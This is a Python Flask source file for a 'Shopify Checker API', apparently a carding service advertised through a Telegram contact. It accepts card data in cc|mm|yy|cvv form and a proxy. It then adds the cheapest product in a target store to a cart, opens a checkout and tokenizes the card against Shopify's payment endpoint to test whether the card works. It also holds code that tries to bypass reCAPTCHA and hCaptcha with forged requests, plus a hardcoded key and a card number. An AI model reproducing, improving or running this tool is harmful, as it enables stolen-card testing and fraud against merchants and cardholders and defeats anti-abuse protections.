"""
Shopify Checker API with Integrated Captcha Solver
Format: /index.php?key=API_KEY&url=SHOP_URL&proxy=PROXY&cc=CC_DATA
Support: https://t.me/streetfind
"""

from flask import Flask, jsonify, request
import requests
import json
import uuid
import time
import random
import re
import sys
import logging
import urllib3
import os

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="ignore")
    sys.stderr.reconfigure(encoding="utf-8", errors="ignore")
except Exception:
    pass

from urllib.parse import urlparse, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================
# CONFIGURATION
# ============================================

API_KEY = "DARK-STORMX-DEEPX"  # Your API key
CAPTCHA_SOLVER_ENABLED = True
MAX_RETRIES = 3
RETRY_DELAY = 2

# Checkout data
CHECKOUT_DATA = {
    "email": "test@example.com",
    "first_name": "John",
    "last_name": "Doe",
    "address1": "4024 College Point Boulevard",
    "city": "Flushing",
    "province": "NY",
    "zip": "11354",
    "country": "US",
    "phone": "2494851515",
    "coordinates": {
        "latitude": 40.7589,
        "longitude": -73.9851
    }
}

DEFAULT_CARD_DATA = {
    "number": "4342580222985194",
    "month": 4,
    "year": 2028,
    "verification_value": "000",
    "name": "Test Card"
}


# ============================================
# CAPTCHA SOLVER FUNCTIONS
# ============================================

def detect_site_key_from_page(store_url, timeout=10):
    """Detect captcha site key from store page"""
    try:
        if not store_url.startswith(('http://', 'https://')):
            store_url = 'https://' + store_url

        paths_to_check = ['', '/checkout', '/cart', '/account/login']
        session = requests.Session()
        session.verify = False

        for path in paths_to_check:
            try:
                url = urljoin(store_url, path)
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "text/html,application/xhtml+xml",
                }
                response = session.get(url, headers=headers, timeout=timeout)
                if response.status_code == 200:
                    result = parse_captcha_from_html(response.text, store_url)
                    if result and result.get('success'):
                        session.close()
                        return result
            except:
                continue

        session.close()
    except Exception as e:
        logger.error(f"Site key detection error: {e}")

    return {"success": False}


def parse_captcha_from_html(html_content, base_url=""):
    """Parse captcha info from HTML"""
    try:
        # reCAPTCHA patterns
        recaptcha_patterns = [
            r'data-sitekey=["\']([a-zA-Z0-9_-]{40})["\']',
            r'recaptcha/sitekey["\']?\s*:\s*["\']([a-zA-Z0-9_-]{40})["\']',
            r'google\.com/recaptcha/api.*?k=([a-zA-Z0-9_-]{40})',
        ]

        for pattern in recaptcha_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            if matches:
                site_key = matches[0]
                if len(site_key) == 40 and site_key.startswith('6L'):
                    return {
                        "success": True,
                        "site_key": site_key,
                        "captcha_type": "recaptcha",
                        "detection_method": "html_parse"
                    }

        # hCaptcha patterns
        hcaptcha_patterns = [
            r'data-sitekey=["\']([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})["\']',
            r'hcaptcha\.com.*?sitekey=["\']([a-f0-9-]{36})["\']',
        ]

        for pattern in hcaptcha_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            if matches:
                site_key = matches[0]
                if len(site_key) == 36:
                    return {
                        "success": True,
                        "site_key": site_key,
                        "captcha_type": "hcaptcha",
                        "detection_method": "html_parse"
                    }
    except Exception as e:
        logger.error(f"Parse HTML error: {e}")

    return {"success": False}


def solve_recaptcha_v2(site_key, page_url="https://example.com", invisible=True, max_retries=5):
    """Solve reCAPTCHA v2"""
    start_time = time.time()

    for attempt in range(max_retries):
        try:
            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            co_value = "aHR0cHM6Ly9jaGVja291dC5zaG9waWZ5LmNvbTo0NDM."

            anchor_params = {
                "ar": str(random.randint(1, 5)),
                "hl": "en",
                "v": "V6_85qpc2Xf2sbe3xTnRte7m",
                "cb": str(int(time.time() * 1000) + random.randint(1000, 9999))
            }

            anchor_url = (
                f"https://www.google.com/recaptcha/api2/anchor?"
                f"ar={anchor_params['ar']}&k={site_key}&co={co_value}"
                f"&hl={anchor_params['hl']}&v={anchor_params['v']}"
                f"&size={'invisible' if invisible else 'normal'}&cb={anchor_params['cb']}"
            )

            headers = {
                "User-Agent": user_agent,
                "Accept": "text/html,application/xhtml+xml",
            }

            session = requests.Session()
            session.verify = False
            response = session.get(anchor_url, headers=headers, timeout=15)

            if response.status_code == 200:
                token_match = re.search(r'id="recaptcha-token"\s+value="([^"]+)"', response.text)
                if token_match:
                    token = token_match.group(1)

                    reload_data = {
                        "v": "UFwvoDBMjc8LiYc1DKXiAomK",
                        "reason": "q",
                        "c": token,
                        "k": site_key,
                        "co": co_value,
                        "hl": anchor_params['hl'],
                        "size": "invisible" if invisible else "normal",
                        "chr": f"[{random.randint(60,90)},{random.randint(30,60)},{random.randint(80,100)}]",
                        "vh": str(random.randint(7000000000, 8000000000)),
                        "bg": ""
                    }

                    reload_response = session.post(
                        "https://www.google.com/recaptcha/api2/reload",
                        data=reload_data,
                        headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
                        timeout=15
                    )

                    if reload_response.status_code == 200:
                        captcha_token_match = re.search(r'"rresp","([^"]+)"', reload_response.text)
                        if captcha_token_match:
                            captcha_token = captcha_token_match.group(1)
                            if len(captcha_token) > 10:
                                session.close()
                                return {
                                    "success": True,
                                    "token": captcha_token,
                                    "site_key": site_key,
                                    "page_url": page_url,
                                    "captcha_type": "recaptcha",
                                    "time_taken": round(time.time() - start_time, 2),
                                    "attempt": attempt + 1
                                }

            session.close()

        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(1)
                continue

    return {
        "success": False,
        "error": "All retry attempts failed",
        "time_taken": round(time.time() - start_time, 2)
    }


def solve_hcaptcha(site_key, page_url="https://example.com", max_retries=3):
    """Solve hCaptcha"""
    start_time = time.time()

    for attempt in range(max_retries):
        try:
            session = requests.Session()
            session.verify = False
            response = session.post(
                "https://hcaptcha.com/getcaptcha",
                data={
                    "sitekey": site_key,
                    "host": page_url,
                    "hl": "en",
                    "v": "1",
                    "swa": "1"
                },
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                timeout=15
            )

            if response.status_code == 200:
                result = response.json()
                if "key" in result or "token" in result:
                    session.close()
                    return {
                        "success": True,
                        "token": result.get("key") or result.get("token"),
                        "site_key": site_key,
                        "page_url": page_url,
                        "captcha_type": "hcaptcha",
                        "time_taken": round(time.time() - start_time, 2),
                        "attempt": attempt + 1
                    }

            session.close()

        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(1)
                continue

    return {
        "success": False,
        "error": "hCaptcha solving failed",
        "time_taken": round(time.time() - start_time, 2)
    }


def solve_captcha_auto(shop_url, max_retries=3):
    """
    Auto-detect and solve captcha
    Returns captcha token if successful, None if failed
    """
    if not CAPTCHA_SOLVER_ENABLED:
        return None

    for attempt in range(max_retries):
        try:
            # Step 1: Detect site key from page
            detection_result = detect_site_key_from_page(shop_url)

            if not detection_result.get('success'):
                logger.warning(f"⚠️ Could not detect captcha type")
                if attempt < max_retries - 1:
                    time.sleep(RETRY_DELAY)
                continue

            captcha_type = detection_result.get('captcha_type', 'recaptcha')
            site_key = detection_result.get('site_key')

            logger.info(f"✅ Detected {captcha_type} with site key: {site_key[:20]}...")

            # Step 2: Solve based on captcha type
            if captcha_type == 'recaptcha':
                solve_result = solve_recaptcha_v2(site_key, shop_url)
            elif captcha_type == 'hcaptcha':
                solve_result = solve_hcaptcha(site_key, shop_url)
            else:
                logger.warning(f"⚠️ Unsupported captcha type: {captcha_type}")
                if attempt < max_retries - 1:
                    time.sleep(RETRY_DELAY)
                continue

            if solve_result.get('success'):
                logger.info(f"✅ Captcha solved in {solve_result.get('time_taken', 'N/A')}s")
                return solve_result.get('token')
            else:
                logger.warning(f"⚠️ Captcha solve failed: {solve_result.get('error', 'Unknown')}")

            if attempt < max_retries - 1:
                time.sleep(RETRY_DELAY)

        except Exception as e:
            logger.error(f"❌ Captcha API error: {e}")
            if attempt < max_retries - 1:
                time.sleep(RETRY_DELAY)

    return None


# ============================================
# CHECKER FUNCTIONS
# ============================================

def create_session(shop_url, proxies=None):
    """Create requests session"""
    session = requests.Session()
    session.trust_env = False if proxies else True
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
        'Accept-Language': 'en-US',
        'Content-Type': 'application/json',
        'Origin': shop_url,
        'Referer': f'{shop_url}/',
    })
    if proxies:
        try:
            session.proxies.update(proxies)
        except Exception:
            pass
    return session


def get_cheapest_product(session, shop_url):
    """Get cheapest product from shop"""
    try:
        url = f"{shop_url}/products.json?limit=250"
        r = session.get(url, timeout=15, verify=False)
        if r.status_code == 200:
            data = r.json()
            products = data if isinstance(data, list) else data.get('products', [])

            valid_products = []
            for product in products:
                product_id = product.get('id')
                product_title = product.get('title', 'Unknown')
                variants = product.get('variants', [])

                for variant in variants:
                    variant_id = variant.get('id')
                    price_str = variant.get('price', '0')
                    available = variant.get('available', False)

                    try:
                        price = float(price_str)
                        if available and price > 0:
                            valid_products.append({
                                'id': str(product_id),
                                'variant_id': str(variant_id),
                                'price': price,
                                'price_str': price_str,
                                'title': product_title,
                                'available': True
                            })
                    except (ValueError, TypeError):
                        continue

            if valid_products:
                valid_products.sort(key=lambda x: x['price'])
                cheapest = valid_products[0]
                return cheapest['id'], cheapest['variant_id'], cheapest['price_str'], cheapest['title']
    except Exception as e:
        logger.error(f"Product detection error: {e}")

    return None, None, None, None


def add_to_cart(session, shop_url, variant_id):
    """Add product to cart and create checkout"""
    try:
        add_url = f"{shop_url}/cart/add.js"
        payload = {"id": variant_id, "quantity": 1}
        r = session.post(add_url, json=payload, timeout=15, verify=False)

        checkout_url = f"{shop_url}/checkout"
        r = session.get(checkout_url, allow_redirects=True, timeout=15, verify=False)

        final_url = r.url
        if '/checkouts/cn/' in final_url:
            checkout_token = final_url.split('/checkouts/cn/')[1].split('/')[0]
            return checkout_token, r.cookies
    except Exception as e:
        logger.error(f"Add to cart error: {e}")

    return None, None


def tokenize_card(session, checkout_token, shop_url, card_data):
    """Tokenize credit card"""
    try:
        time.sleep(random.uniform(1.2, 2.0))

        scope_host = urlparse(shop_url).netloc or shop_url.replace('https://', '').replace('http://', '').split('/')[0]

        payload = {
            "credit_card": {
                "number": card_data["number"],
                "month": card_data["month"],
                "year": card_data["year"],
                "verification_value": card_data["verification_value"],
                "start_month": None,
                "start_year": None,
                "issue_number": "",
                "name": card_data["name"]
            },
            "payment_session_scope": scope_host
        }

        ep_url = "https://checkout.pci.shopifyinc.com/sessions"
        origin = "https://checkout.pci.shopifyinc.com"
        referer = "https://checkout.pci.shopifyinc.com/"

        headers = {
            "Origin": origin,
            "Referer": referer,
            "Content-Type": "application/json",
            "Accept": "application/json",
            "User-Agent": session.headers.get("User-Agent", "Mozilla/5.0"),
        }

        r = session.post(ep_url, json=payload, headers=headers, timeout=15, verify=False)

        if r.status_code == 200:
            token_data = r.json()
            card_session_id = token_data.get("id")
            if card_session_id:
                return card_session_id

        logger.error(f"Card tokenization failed: {r.status_code}")
    except Exception as e:
        logger.error(f"Card tokenization error: {e}")

    return None


# ============================================
# MAIN API ENDPOINT
# ============================================

@app.route('/index.php', methods=['GET', 'POST'])
def checker_api():
    """
    Main checker endpoint
    Format: /index.php?key=API_KEY&url=SHOP_URL&proxy=PROXY&cc=CC_DATA
    """
    start_time = time.time()

    # Get parameters
    api_key = request.args.get('key') or request.args.get('api_key')
    shop_url = request.args.get('url')
    proxy = request.args.get('proxy')
    cc_data = request.args.get('cc')

    # Validate API key
    if not api_key:
        return jsonify({
            "success": False,
            "error": "API key required",
            "format": "/index.php?key=YOUR_KEY&url=SHOP_URL&proxy=PROXY&cc=CC_DATA"
        }), 400

    if api_key != API_KEY:
        return jsonify({
            "success": False,
            "error": "Invalid API key"
        }), 401

    # Validate shop URL
    if not shop_url:
        return jsonify({
            "success": False,
            "error": "Shop URL required"
        }), 400

    # Normalize shop URL
    if not shop_url.startswith(('http://', 'https://')):
        shop_url = f"https://{shop_url}"

    # Parse proxy
    proxies = None
    if proxy:
        try:
            # Format: host:port:user:pass or host:port
            parts = proxy.split(':')
            if len(parts) >= 4:
                host, port, user, passwd = parts[0], parts[1], parts[2], parts[3]
                proxy_url = f"http://{user}:{passwd}@{host}:{port}"
            else:
                proxy_url = f"http://{proxy}"
            proxies = {"http": proxy_url, "https": proxy_url}
        except Exception as e:
            logger.error(f"Proxy parse error: {e}")

    # Parse CC data
    card_data = DEFAULT_CARD_DATA.copy()
    if cc_data:
        try:
            # Format: cc|mm|yy|cvv
            parts = cc_data.split('|')
            if len(parts) >= 4:
                card_data["number"] = parts[0]
                card_data["month"] = int(parts[1])
                card_data["year"] = int(parts[2]) if len(parts[2]) == 2 else int(parts[2])
                card_data["verification_value"] = parts[3]
        except Exception as e:
            logger.error(f"CC data parse error: {e}")

    # Start checking
    result = {
        "success": False,
        "shop_url": shop_url,
        "captcha_solved": False,
        "captcha_token": None,
        "checkout_token": None,
        "card_token": None,
        "error": None,
        "time_taken": 0
    }

    try:
        session = create_session(shop_url, proxies)

        # Step 1: Solve captcha (if enabled)
        if CAPTCHA_SOLVER_ENABLED:
            logger.info("🔄 Solving captcha...")
            captcha_token = solve_captcha_auto(shop_url)
            if captcha_token:
                result["captcha_solved"] = True
                result["captcha_token"] = captcha_token
                logger.info("✅ Captcha solved successfully")
            else:
                logger.warning("⚠️ Captcha solving failed, continuing anyway...")

        # Step 2: Get cheapest product
        logger.info("🔄 Finding cheapest product...")
        product_id, variant_id, price, title = get_cheapest_product(session, shop_url)
        if not variant_id:
            result["error"] = "No products found"
            session.close()
            return jsonify(result), 400

        result["product"] = {
            "id": product_id,
            "variant_id": variant_id,
            "price": price,
            "title": title
        }
        logger.info(f"✅ Found product: {title} (${price})")

        # Step 3: Add to cart and create checkout
        logger.info("🔄 Adding to cart...")
        checkout_token, cookies = add_to_cart(session, shop_url, variant_id)
        if not checkout_token:
            result["error"] = "Failed to create checkout"
            session.close()
            return jsonify(result), 400

        result["checkout_token"] = checkout_token
        logger.info(f"✅ Checkout created: {checkout_token[:20]}...")

        # Step 4: Tokenize card
        logger.info("🔄 Tokenizing card...")
        card_token = tokenize_card(session, checkout_token, shop_url, card_data)
        if card_token:
            result["card_token"] = card_token
            logger.info(f"✅ Card tokenized: {card_token[:20]}...")
        else:
            result["error"] = "Card tokenization failed"
            session.close()
            return jsonify(result), 400

        # Success!
        result["success"] = True
        result["message"] = "Checkout ready"
        session.close()

    except Exception as e:
        logger.error(f"Checker error: {e}")
        result["error"] = str(e)

    result["time_taken"] = round(time.time() - start_time, 2)
    return jsonify(result)


@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "captcha_solver": "enabled" if CAPTCHA_SOLVER_ENABLED else "disabled",
        "timestamp": time.time()
    })


@app.route('/', methods=['GET'])
def index():
    """API info"""
    return jsonify({
        "name": "Shopify Checker API with Captcha Solver",
        "version": "1.0",
        "endpoints": {
            "/index.php": "Main checker endpoint",
            "/health": "Health check"
        },
        "usage": "/index.php?key=API_KEY&url=SHOP_URL&proxy=PROXY&cc=CC_DATA",
        "example": "/index.php?key=DARK-STORMX-DEEPX&url=https://example.myshopify.com&proxy=host:port:user:pass&cc=4342580222985194|04|28|000",
        "support": "https://t.me/streetfind"
    })


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
